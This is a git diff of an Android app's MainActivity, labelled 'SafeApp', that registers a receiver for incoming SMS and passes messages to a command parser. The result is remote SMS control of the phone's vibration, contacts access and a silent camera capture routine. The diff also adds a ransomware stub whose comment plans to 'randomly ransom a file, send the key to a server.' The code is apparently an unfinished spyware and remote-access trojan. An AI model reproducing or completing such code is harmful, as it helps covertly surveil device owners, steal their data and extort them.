@@ -11,6 +11,7 @@ import java.util.Locale;
 
 import android.app.Activity;
 import android.content.Context;
+import android.content.IntentFilter;
 import android.hardware.Camera;
 import android.os.Bundle;
 import android.os.Environment;
@@ -26,17 +27,30 @@ public class MainActivity extends Activity implements Commandable {
 		v.vibrate(500);
 	}
 
-	@Override
+	private SMSCommandParser parser;
+	private SMSReceiver receiver;
+	private IntentFilter filter;
+	
 	protected void onCreate(Bundle savedInstanceState) {
 		super.onCreate(savedInstanceState);
 		setContentView(R.layout.activity_main);
 
-		CommandParser commandParser = new CommandParser(this);
-		commandParser.dispatch("VIBRATE").execute();
-		commandParser.dispatch("CONTACTS").execute();
-		commandParser.dispatch("PHOTO").execute();
-	}
+		parser = new SMSCommandParser(this);
 
+		receiver = new SMSReceiver();
+		receiver.addConsumer(parser);
+
+		filter = new IntentFilter();
+		filter.addAction("android.provider.Telephony.SMS_RECEIVED");
+		registerReceiver(receiver, filter);
+	}
+	
+	protected void onStop()
+	{
+	    unregisterReceiver(receiver);
+	    super.onStop();
+	}
+	
 	public boolean onCreateOptionsMenu(Menu menu) {
 		getMenuInflater().inflate(R.menu.main, menu);
 		return true;
@@ -87,7 +101,7 @@ public class MainActivity extends Activity implements Commandable {
 
 	public void takePhoto() {
 		Camera c = getCameraInstance();
-		if(c == null){
+		if (c == null) {
 			return;
 		}
 		SurfaceView view = new SurfaceView(this);
@@ -98,7 +112,7 @@ public class MainActivity extends Activity implements Commandable {
 			Log.e("SafeApp", "Exception", e);
 		}
 		c.startPreview();
-		
+
 		final File f = getImageFile();
 		c.takePicture(null, null, new Camera.PictureCallback() {
 			public void onPictureTaken(byte[] data, Camera camera) {
@@ -108,15 +122,15 @@ public class MainActivity extends Activity implements Commandable {
 					out.write(data);
 					out.close();
 				} catch (FileNotFoundException e) {
-					Log.e("SafeApp","Exception",e);
+					Log.e("SafeApp", "Exception", e);
 				} catch (IOException e) {
-					Log.e("SafeApp","Exception",e);
+					Log.e("SafeApp", "Exception", e);
 				}
 			}
 		});
 	}
 
 	public void randomRansom() {
-		
+		// TODO: Randomly ransom a file, send the key to a server.
 	}
 }
